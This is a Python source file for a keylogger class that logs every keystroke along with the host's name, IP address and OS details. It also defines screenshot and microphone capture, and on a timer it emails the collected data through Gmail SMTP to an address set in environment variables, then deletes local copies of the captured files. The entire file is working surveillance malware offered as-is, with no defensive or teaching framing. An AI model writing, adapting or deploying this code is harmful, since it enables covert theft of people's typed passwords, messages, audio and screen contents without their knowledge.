import logging
import os
import smtplib
import threading
import wave
import sounddevice as sd
from pynput import keyboard, mouse
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
import pyscreenshot
import time
import platform
import socket

# Configuration
try:
    EMAIL_ADDRESS = os.environ["EMAIL_ADDRESS"]
    EMAIL_PASSWORD = os.environ["EMAIL_PASSWORD"]
except KeyError as e:
    print(f"Error: Missing environment variable {e}. Please set EMAIL_ADDRESS and EMAIL_PASSWORD.")
    exit(1)

SEND_REPORT_EVERY = 60  # seconds


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password
        self.log_file = "keylog.txt"
        self.audio_file = "audio.wav"
        self.screenshot_file = "screenshot.png"
        logging.basicConfig(filename=self.log_file, level=logging.INFO, format="%(asctime)s - %(message)s")
        self.system_information()

    def append_log(self, message):
        self.log += f"{message}\n"
        logging.info(message)

    def system_information(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        os_details = f"{platform.system()} {platform.version()} {platform.machine()}"
        self.append_log(f"Hostname: {hostname}")
        self.append_log(f"IP Address: {ip_address}")
        self.append_log(f"OS Details: {os_details}")

    def on_press(self, key):
        try:
            self.append_log(f"Key pressed: {key.char}")
        except AttributeError:
            self.append_log(f"Key pressed: {key}")

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def record_audio(self):
        try:
            fs = 44100
            duration = self.interval
            audio_data = sd.rec(int(fs * duration), samplerate=fs, channels=2, dtype="float32")
            sd.wait()

            with wave.open(self.audio_file, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(audio_data.tobytes())

            self.append_log("Audio recorded successfully.")
        except Exception as e:
            logging.error(f"Error recording audio: {e}")

    def take_screenshot(self):
        try:
            pyscreenshot.grab().save(self.screenshot_file)
            self.append_log("Screenshot taken successfully.")
        except Exception as e:
            logging.error(f"Error taking screenshot: {e}")

    def send_email(self):
        try:
            msg = MIMEMultipart()
            msg["From"] = self.email
            msg["To"] = self.email  # Update with actual recipient
            msg["Subject"] = "Keylogger Report"

            # Attach log file
            msg.attach(MIMEText(self.log, "plain"))

            # Attach audio file
            if os.path.exists(self.audio_file):
                with open(self.audio_file, "rb") as f:
                    audio_part = MIMEBase("application", "octet-stream")
                    audio_part.set_payload(f.read())
                encoders.encode_base64(audio_part)
                audio_part.add_header("Content-Disposition", f"attachment; filename={self.audio_file}")
                msg.attach(audio_part)

            # Attach screenshot
            if os.path.exists(self.screenshot_file):
                with open(self.screenshot_file, "rb") as f:
                    screenshot_part = MIMEBase("image", "png")
                    screenshot_part.set_payload(f.read())
                encoders.encode_base64(screenshot_part)
                screenshot_part.add_header("Content-Disposition", f"attachment; filename={self.screenshot_file}")
                msg.attach(screenshot_part)

            # Send email
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(self.email, self.password)
                server.send_message(msg)

            self.append_log("Email sent successfully.")
        except Exception as e:
            logging.error(f"Error sending email: {e}")
        finally:
            # Cleanup
            if os.path.exists(self.audio_file):
                os.remove(self.audio_file)
            if os.path.exists(self.screenshot_file):
                os.remove(self.screenshot_file)

    def run(self):
        self.append_log("Keylogger started.")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as key_listener, \
                mouse.Listener() as mouse_listener:
            timer = threading.Timer(self.interval, self.send_email)
            timer.start()
            key_listener.join()
            mouse_listener.join()


# Start Keylogger
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
